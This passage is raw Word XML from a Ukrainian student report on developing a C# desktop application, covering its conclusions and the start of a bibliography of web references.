          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>вівчається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Стосовно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спеціфікі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розробки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сучасного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програмного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забезпечення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>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розвинутості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навички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ведення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командних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> теоретичного и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>практичних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ДОСЛІДЖЕНЬ в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>напрямку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проектування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програмного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забезпечення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> набути </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>досвіду</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ОБРОБКИ, АНАЛІЗУ та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>сістематізації</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результатів</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практичних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ДОСЛІДЖЕНЬ; </w:t>
      </w:r>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Сформувати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навички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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Наукова</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літературою</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> та правильного </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>оформлення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дослідніцькіх</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робіт</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>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закріпіті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навички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науково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оформляті</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>викладати</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> свои думки, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Висновки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>результати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дослідження</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ході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Виконання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> первого </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>розділу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> БУВ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>проведень</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аналіз</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розробки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 xml:space="preserve"> для персонального </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>комп'ютера</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Була</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> представлена ​​структура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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Проведено </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>аналіз</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аналогів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Сайти</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Вся. В </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ході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Виконання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булу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спроектована</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архітектура</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Було</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> описано </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>бачення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системи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корістувацькі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> роли, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>корістувацькі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історії</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сформованому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backlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> продукту. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Розроблені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прототипи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графічного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інтерфейсу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віявлені</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. Були </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>напісані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діаграмі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класів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>послідовностей</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. Описаний </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>процес</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роботи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програмного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Наведені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скріншоти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інтерфейсу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. Я получила </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>досвід</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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>мовою</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програмування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> C #, а </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>такоже</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Практичні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навички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розробки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десктопного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 xml:space="preserve">. Я </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Переконайся</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> у тому, что </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>отриманий</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досвід</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безперечно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Знадоби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мені</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> у </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>професії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsid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keepNext/>
        <w:pageBreakBefore/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc10727440"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ЛІТЕРАТУРА</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId63" w:history="1">
        <w:r w:rsidRPr="00A7731B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:lang w:val="uk-UA"/>
          </w:rPr>
          <w:t>https://ru.wikipedia.org/wiki/Java</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>https://www.syl.ru/article/199389/new_sovremennyiy-yazyik-programmirovaniya-vyisokogo-urovnya-primeryi-i-sravneniya</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>https://ru.wikipedia.org/wiki/%D0%A1%D0%B2%D0%B5%D1%80%D1%85%D0%B2%D1%8B%D1%81%D0%BE%D0 % BA% D0% BE% D1% 83% D1% 80% D0% BE% D0% B2% D0% BD% D0% B5% D0% B2% D1% 8B% D0% B9_% D1% 8F% D0% B7 % D1% 8B% D0% BA_% D0% BF% D1% 80% D0% BE% D0% B3% D1% 80% D0% B0% D0% BC% D0% BC% D0% B8% D1% 80% D0 % BE% D0% B2% D0% B0% D0% BD% D0% B8% D1% 8F</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>http://fb.ru/article/168378/spisok-yazyikov-programmirovaniya-yazyiki-programmirovaniya-nizkogo-i-vyisokogo-urovnya</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
